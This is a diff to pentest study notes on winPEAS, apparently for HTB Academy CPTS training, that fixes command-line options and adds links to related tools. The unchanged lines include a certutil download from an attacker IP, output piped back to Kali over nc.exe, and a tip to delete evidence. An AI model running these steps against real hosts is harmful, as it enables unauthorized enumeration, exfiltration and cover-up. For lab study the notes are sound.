@@ -29,8 +29,9 @@ certutil -urlcache -split -f http://10.10.14.5:8000/winPEASx64.exe C:\Temp\wp.ex
 # Execute
 C:\Temp\wp.exe
 
-# Output to file (preserves color with -ansi)
-C:\Temp\wp.exe | Out-File -Encoding ascii C:\Temp\winpeas_out.txt
+# Output to file — use `notcolor` so ANSI codes don't garble the file
+# (there is no -ansi flag; piping raw output embeds escape codes)
+C:\Temp\wp.exe notcolor > C:\Temp\winpeas_out.txt
 
 # Pipe back to Kali via nc
 C:\Temp\wp.exe | nc.exe 10.10.14.5 9001
@@ -44,20 +45,20 @@ C:\Temp\wp.exe | nc.exe 10.10.14.5 9001
 # Full run (all checks)
 winPEASx64.exe
 
-# Specific category only
+# Specific category only (space-separate several)
 winPEASx64.exe systeminfo
-winPEASx64.exe userinfo
-winPEASx64.exe processinfo
+winPEASx64.exe userinfo processinfo
 winPEASx64.exe servicesinfo
 winPEASx64.exe applicationsinfo
 winPEASx64.exe networkinfo
 winPEASx64.exe filesinfo
 
-# Quiet (no banner/color)
-winPEASx64.exe quiet
-
-# Fast — skip slow checks
-winPEASx64.exe fast
+# Real modifiers (there is NO `quiet` or `fast` option — the default already
+# skips the slower checks):
+winPEASx64.exe notcolor           # strip ANSI colour (for redirecting to a file)
+winPEASx64.exe log                # also write results to out.txt
+winPEASx64.exe -lolbas            # add a LOLBAS search
+winPEASx64.exe -vulnpackages      # check installed software vs online vuln DB (slow, noisy)
 ```
 
 ---
@@ -113,9 +114,9 @@ winPEAS.bat
 - Clear evidence: delete binary and temp files after review
 
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — automated privesc enumeration on Windows hosts.
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — automated privesc enumeration on Windows hosts. Quieter/targeted alternatives: [[Tools/Scanning/PowerUp|PowerUp]] (PowerShell, service/registry), [[Tools/Scanning/Seatbelt|Seatbelt]] (C# host survey). Act on a `SeImpersonate` finding with [[Tools/Lateral Movement/Potato|Potato]]; Linux counterpart is linPEAS.
 ---
 
 *Created: 2026-03-13*
-*Updated: 2026-08-18*
+*Updated: 2026-08-31*
 *Model: claude-opus-5*
